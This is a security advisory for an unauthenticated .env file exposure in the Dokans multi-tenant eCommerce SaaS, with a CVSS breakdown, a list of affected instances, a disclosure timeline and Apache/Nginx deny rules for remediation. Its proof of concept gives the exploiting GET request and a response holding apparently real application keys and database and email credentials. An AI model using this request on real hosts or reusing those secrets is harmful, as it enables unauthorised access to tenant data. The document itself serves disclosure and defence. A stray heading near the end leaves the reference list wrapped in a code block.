# CVE-2025-70841 — Dokans Multi-Tenancy SaaS .env Exposure

| Field | Details |
|-------|---------|
| **CVE** | CVE-2025-70841 |
| **Product** | Dokans Multi-Tenancy Based eCommerce Platform SaaS |
| **Vendor** | AMCoders |
| **Version** | 3.9.2 |
| **Type** | Sensitive Information Disclosure |
| **CWE** | CWE-538, CWE-200 |
| **CVSS v3.1** | 9.1 CRITICAL |
| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N |
| **Status** | ✅ Patched |
| **Discovered by** | Lucas Valente Lima |

---

## Summary

Dokans Multi-Tenancy Based eCommerce Platform SaaS by AMCoders exposed its Laravel `.env` configuration file via an unauthenticated GET request to `/script/.env`. The exposed file contained critical secrets including the application encryption key (`APP_KEY`), database credentials, SendGrid API keys, and internal configuration parameters. Due to the multi-tenancy architecture, this single vulnerability compromised all tenants in the system.

The vendor (AMCoders) has patched this vulnerability. The fix has been confirmed on the demo instances.

---

## Affected Endpoints

| Endpoint | Method | Authentication | Status |
|----------|--------|----------------|--------|
| `/script/.env` | GET | None required | ✅ Patched |

---

## Exposed Data

The `.env` file contains but is not limited to:

| Secret | Impact |
|--------|--------|
| `APP_KEY` | Session forgery, authentication bypass |
| `DB_HOST`, `DB_USERNAME`, `DB_PASSWORD` | Direct database access to all tenant data |
| `MAIL_PASSWORD` (SendGrid API key) | Email infrastructure takeover, phishing |
| `APP_DEBUG=true` | Detailed error messages, internal paths |
| `APP_NAME`, `APP_URL` | Application enumeration |

---

## Previously Vulnerable Instances

All tested official instances were confirmed vulnerable (100% vulnerable) prior to the patch:

- https://dokans.website
- https://bigbag.dokans.website
- https://saka-cart.dokans.website
- https://bazar.dokans.website
- https://arafa-cart.dokans.website

---

## CVSS v3.1 Breakdown

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | Remotely exploitable via HTTP |
| Attack Complexity | Low | Single GET request, no conditions |
| Privileges Required | None | No authentication required |
| User Interaction | None | Fully automated exploitation |
| Scope | Changed | Compromises entire multi-tenant environment |
| Confidentiality | High | All secrets and tenant data exposed |
| Integrity | High | Authentication bypass via APP_KEY |
| Availability | None | No direct availability impact |

---

## Proof of Concept

```http
GET /script/.env HTTP/1.1
Host: dokans.website
```

**Response (prior to patch):**
```
HTTP/1.1 200 OK
Content-Type: application/octet-stream

APP_NAME=dokans
APP_KEY=base64:kZN2g9Tg6+mi1YNc+sSiZAO2ljlQBfLC3ByJLhLAUVc=
DB_HOST=127.0.0.1
DB_DATABASE=dokans
DB_USERNAME=root
DB_PASSWORD=PdGmjmGF7KhXh2H@@S
MAIL_DRIVER=sendgrid
MAIL_PASSWORD=SG.8vFCc6WbRwag7tlNeCIf6Q...
APP_DEBUG=true
```

---

## Impact

### 1. Authentication Bypass
The exposed `APP_KEY` allowed an attacker to forge valid Laravel session tokens, granting full admin access without credentials.

### 2. Database Compromise
Exposed database credentials provided direct MySQL access to all tenant data, including user accounts, orders, payment information, and personal details.

### 3. Email Infrastructure Takeover
The SendGrid API key enabled sending emails from the platform's domain, facilitating large-scale phishing campaigns targeting the platform's customers.

### 4. Supply Chain Impact
As a CodeCanyon marketplace product, every customer who purchased and deployed Dokans was affected. The vulnerability existed in the software itself, not in individual deployments.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-01-04 | Vulnerability discovered |
| 2026-01-04 | Vendor notified via email (amworkbd@gmail.com) |
| 2026-01-04 | CVE requested from MITRE |
| 2026-01-30 | CVE-2025-70841 assigned by MITRE |
| 2026-02-01 | Vendor confirmed fix deployed |
| 2026-02-01 | Advisory published |

---

## Remediation

The vendor has released a patch. Users should update to the latest version of Dokans available on [CodeCanyon](https://codecanyon.net/item/dokans-multitenancy-based-ecommerce-platform-saas/31122915).

### Additional steps for existing deployments
1. Rotate all credentials: `APP_KEY`, database passwords, SendGrid API keys
2. Block access to `.env` via web server configuration as defense-in-depth

### Apache
```apache
<FilesMatch "^\.env">
    Require all denied
</FilesMatch>
```

### Nginx
```nginx
location ~ /\.env {
    deny all;
    return 404;
}
```

### Apache
```apache

- [CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory](https://cwe.mitre.org/data/definitions/538.html)
- [CWE-200: Sensitive Data Exposure](https://cwe.mitre.org/data/definitions/200.html)
- [Dokans — CodeCanyon](https://codecanyon.net/item/dokans-multitenancy-based-ecommerce-platform-saas/31122915)

---

## Credits

Discovered by **Lucas Valente Lima** — OSCP, OSWP, eWPTX, CEH, CWES, CPTS
